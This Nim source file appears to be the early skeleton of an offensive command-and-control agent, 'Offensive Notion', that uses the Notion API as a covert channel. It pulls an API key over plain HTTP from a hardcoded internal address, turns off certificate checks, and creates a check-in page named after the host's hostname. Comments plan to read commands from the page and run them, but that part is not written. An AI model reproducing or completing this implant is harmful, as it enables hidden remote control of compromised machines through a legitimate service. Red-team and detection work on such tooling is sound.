import std/[
    json,
    # asyncdispatch,
    strformat, 
    terminal,
    net
]
import system
import parseutils
import os
import nativesockets
import httpclient
import httpcore

#[
    Things we need to do:
    Load the API key*
    Start comms by making a new page*
    Sleep* 
    Get new blocks*
    Any new commands?*
    Do em*
]#

const URL_BASE = "https://api.notion.com/v1"
const API_KEY_URL = "http://172.23.8.114:8888/api.txt"

proc getConfigOptions(): (string, string) =
    #[  
        This procedure represents everything we would want to pull in from a config file at compile time.
        TODO: look into TOML/YAML parsing
    ]#
    echo "[*] Enter agent sleep interval > "
    let SLEEP_INTERVAL = readLine(stdin)

    echo "[*] Enter the ID of the parent page > "
    let PARENT_PAGE = readLine(stdin)

    return (SLEEP_INTERVAL, PARENT_PAGE)


# Create Agent Check-in Page
proc createPage(headers: array[3, (string, string)], configs: tuple): string =
    let hostname = getHostname()
    let url = fmt"{URL_BASE}/pages/"
    # let proxy = newProxy("http://localhost:8080")

    # Craft JSON body
    var body = %*{
        "parent":{
          "type": "page_id",
          "page_id": fmt"{configs[1]}" 
          },
        "properties": {
            "title": [{
                "text": {
                  "content": hostname
                }
            }]
          }
      }
    var bodyString: string = $body
    system.add(bodyString, "++")
    # echo "[*] JSON body:"
    # echo bodyString
    # Craft JSON request
    let headers = newHttpHeaders(headers)
    let client = newHttpClient(
      headers=headers, 
      # proxy=proxy, 
      sslContext=newContext(verifyMode=CVerifyNone)
    )
    let res = client.request(url, httpMethod = HttpPost, body = bodyString)
    if res.status == Http200:
      let page = res.body
      return parseJson(page)["id"].getStr()
    echo res.status
    return ""

proc getApiKey(url: string): string =
    let client = newHttpClient()
    let r = client.get(url)
    result = r.body

# Get new blocks*

# Any new commands?

# Do em*


proc main() =
    echo "[*] Offensive Notion! Because Reasons!"

    let NOTION_API_KEY: string = getApiKey(API_KEY_URL)

    if NOTION_API_KEY != "":
        echo "GOT THE API KEY"
    
    let configs = getConfigOptions()
    let headers = {
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization":  &"Bearer {NOTION_API_KEY}"
    }
    let pageId = createPage(headers, configs)
    echo pageId


when isMainModule:
    main()